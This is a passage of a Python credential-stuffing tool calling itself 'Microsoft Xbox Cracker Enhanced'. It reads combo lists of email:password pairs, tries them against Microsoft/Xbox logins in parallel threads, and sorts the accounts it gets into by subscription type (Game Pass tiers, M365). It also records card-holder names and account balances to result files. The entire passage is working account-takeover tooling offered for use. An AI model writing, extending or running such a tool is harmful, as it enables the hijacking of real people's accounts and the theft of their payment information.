            if 'card_holder' in data:
                extra += f" | Card: {data['card_holder']}"
            if 'balance' in data and data['balance'] != "$0.0":
                extra += f" | Balance: {data['balance']}"
            self.counts['expired'] += 1
            with open(self.expired_file, 'a', encoding='utf-8') as f:
                f.write(format_hit(extra))
        
        elif status == "2FA":
            self.counts['twofa'] += 1
            with open(self.twofa_file, 'a', encoding='utf-8') as f:
                f.write(format_hit("2FA REQUIRED"))
        
        elif status == "BANNED":
            self.counts['banned'] += 1
            with open(self.banned_file, 'a', encoding='utf-8') as f:
                f.write(format_hit("BANNED"))

    def get_counts(self):
        return self.counts

class XboxCrackerStats:
    def __init__(self):
        self.lock = Lock()
        self.total_checked = 0
        self.total_hits = 0
        self.premium_hits = 0
        self.free_hits = 0
        self.expired_hits = 0
        self.bad_accounts = 0
        self.timeouts = 0
        self.errors = 0
        self.gamepass_ultimate = 0
        self.gamepass_pc = 0
        self.gamepass_console = 0
        self.gamepass_core = 0
        self.gamepass_other = 0
        self.m365_hits = 0
        self.other_premium = 0
    
    def increment(self, key: str, value: int = 1):
        with self.lock:
            if hasattr(self, key):
                setattr(self, key, getattr(self, key) + value)
    
    def get_stats(self) -> dict:
        with self.lock:
            return {
                "total_checked": self.total_checked,
                "total_hits": self.total_hits,
                "premium_hits": self.premium_hits,
                "free_hits": self.free_hits,
                "expired_hits": self.expired_hits,
                "bad_accounts": self.bad_accounts,
                "timeouts": self.timeouts,
                "errors": self.errors,
                "gamepass_ultimate": self.gamepass_ultimate,
                "gamepass_pc": self.gamepass_pc,
                "gamepass_console": self.gamepass_console,
                "gamepass_core": self.gamepass_core,
                "gamepass_other": self.gamepass_other,
                "m365_hits": self.m365_hits,
                "other_premium": self.other_premium
            }
    
    def reset(self):
        with self.lock:
            self.total_checked = 0
            self.total_hits = 0
            self.premium_hits = 0
            self.free_hits = 0
            self.expired_hits = 0
            self.bad_accounts = 0
            self.timeouts = 0
            self.errors = 0
            self.gamepass_ultimate = 0
            self.gamepass_pc = 0
            self.gamepass_console = 0
            self.gamepass_core = 0
            self.gamepass_other = 0
            self.m365_hits = 0
            self.other_premium = 0

class XboxCrackerEngine:
    def __init__(self, output_dir: str = None, use_v2: bool = True):
        self.result_manager = XboxResultManager(base_folder=output_dir)
        self.checker = XboxChecker()
        self.stats = XboxCrackerStats()
        self.use_v2 = use_v2
    
    def check_account(self, email: str, password: str) -> dict:
        self.stats.increment("total_checked")
        
        if self.use_v2:
            result = self.checker.check_v2(email, password)
        else:
            result = self.checker.check(email, password)
        
        status = result.get("status")
        if status == "PREMIUM":
            self.stats.increment("total_hits")
            self.stats.increment("premium_hits")
            data = result.get("data", {})
            ptype = data.get("premium_type", "").upper()
            if "ULTIMATE" in ptype:
                self.stats.increment("gamepass_ultimate")
            elif "PC" in ptype and "GAME PASS" in ptype:
                self.stats.increment("gamepass_pc")
            elif "CONSOLE" in ptype:
                self.stats.increment("gamepass_console")
            elif "CORE" in ptype:
                self.stats.increment("gamepass_core")
            elif "M365" in ptype or "OFFICE" in ptype:
                self.stats.increment("m365_hits")
            elif "GAME PASS" in ptype or "XBOX LIVE GOLD" in ptype or "EA PLAY" in ptype:
                self.stats.increment("gamepass_other")
            else:
                self.stats.increment("other_premium")
        elif status == "FREE":
            self.stats.increment("total_hits")
            self.stats.increment("free_hits")
        elif status == "EXPIRED":
            self.stats.increment("total_hits")
            self.stats.increment("expired_hits")
        elif status == "BAD":
            self.stats.increment("bad_accounts")
        elif status == "TIMEOUT":
            self.stats.increment("timeouts")
        elif status == "ERROR":
            self.stats.increment("errors")
        elif status == "BANNED":
            self.stats.increment("bad_accounts")
        elif status == "2FA":
            self.stats.increment("bad_accounts")
        
        self.result_manager.save_result(email, password, result)
        
        return result
    
    def get_stats(self) -> dict:
        stats = self.stats.get_stats()
        stats.update(self.result_manager.get_counts())
        return stats
    
    def reset_stats(self):
        self.stats.reset()
    
    def get_base_folder(self) -> str:
        return self.result_manager.base_folder

import argparse
import threading
import sys
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed

stop_signal = False

def signal_handler(sig, frame):
    global stop_signal
    print("\n[!] Interrupt received, finishing current tasks...")
    stop_signal = True

def worker_task(email, password, engine, print_lock):
    if stop_signal:
        return None
    try:
        result = engine.check_account(email, password)
        status = result.get('status', 'UNKNOWN')
        if status in ("PREMIUM", "FREE", "EXPIRED"):
            color = Fore.GREEN
        elif status in ("2FA", "BANNED"):
            color = Fore.YELLOW
        else:
            color = Fore.WHITE
        with print_lock:
            sys.stdout.write(f"{color}[{status}] {email}{Style.RESET_ALL}\n")
            sys.stdout.flush()
        return result
    except Exception as e:
        with print_lock:
            sys.stdout.write(f"[ERROR] {email} | {str(e)}\n")
            sys.stdout.flush()
        return None

def main():
    global stop_signal
    colorama_init(autoreset=True)
    print(f"{Fore.CYAN}Microsoft Xbox Cracker Enhanced by @ppzp5{Style.RESET_ALL}")
    
    parser = argparse.ArgumentParser(description='Xbox Cracker Tool - Enhanced with Microsoft-FC login')
    parser.add_argument('-i', '--input', help='Path to combo file (Email:Pass)')
    parser.add_argument('-o', '--output', help='Output folder (optional, auto-generated with timestamp)')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads (default: 20)')
    parser.add_argument('--old', action='store_true', help='Use old login method instead of enhanced')
    args = parser.parse_args()

    input_file = args.input
    if not input_file:
        input_file = input("[?] No input file provided. Enter full path to combo file: ").strip()
        if not input_file:
            print("[!] No input file. Exiting.")
            sys.exit(1)

    signal.signal(signal.SIGINT, signal_handler)

    if not os.path.isfile(input_file):
        print(f"[!] File {input_file} not found.")
        sys.exit(1)

    combos = []
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                combos.append((parts[0].strip(), parts[1].strip()))
            elif line:
                parts = line.split(',', 1)
                if len(parts) == 2:
                    combos.append((parts[0].strip(), parts[1].strip()))

    if not combos:
        print("[!] No valid combos found in file.")
        sys.exit(1)

    print(f"[+] Loaded {len(combos)} combos.")
    print(f"[+] Running with {args.threads} threads...")
    print("[+] Results are saved in 'results' folder with per-type files.")
    if not args.old:
        print("[*] Using enhanced login method (Microsoft-FC).")
    else:
        print("[*] Using original login method (xbox (2).py).")

    engine = XboxCrackerEngine(output_dir=args.output, use_v2=not args.old)
    print_lock = threading.Lock()
    completed = 0

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_combo = {executor.submit(worker_task, email, pwd, engine, print_lock): (email, pwd) for email, pwd in combos}
        
        for future in as_completed(future_to_combo):
            if stop_signal:
                executor.shutdown(wait=False, cancel_futures=False)
                break
            completed += 1
            if completed % 50 == 0:
                stats = engine.get_stats()
                with print_lock:
                    sys.stdout.write(f"\r[+] Progress: {completed}/{len(combos)} | Premium: {stats.get('premium_hits', 0)} | Free: {stats.get('free_hits', 0)} | Expired: {stats.get('expired_hits', 0)}")
                    sys.stdout.flush()

    print("\n[+] Finished.")
    final_stats = engine.get_stats()
    print("[+] Final statistics:")
    for key, value in final_stats.items():
        print(f"    {key}: {value}")
    print(f"[+] Results folder: {engine.get_base_folder()}")

if __name__ == "__main__":
    main()